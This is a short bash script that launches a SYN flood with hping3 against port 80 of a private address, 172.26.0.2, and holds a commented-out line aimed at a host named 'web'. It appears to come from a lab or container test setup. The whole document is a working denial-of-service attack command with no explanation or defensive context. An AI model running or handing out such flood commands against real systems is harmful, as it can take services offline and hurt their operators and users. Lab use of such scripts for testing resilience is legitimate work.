#!/bin/bash

TARGET_IP="web"
#hping3 -S -p 80 --flood $TARGET_IP
hping3 -S -p 80 --flood 172.26.0.2
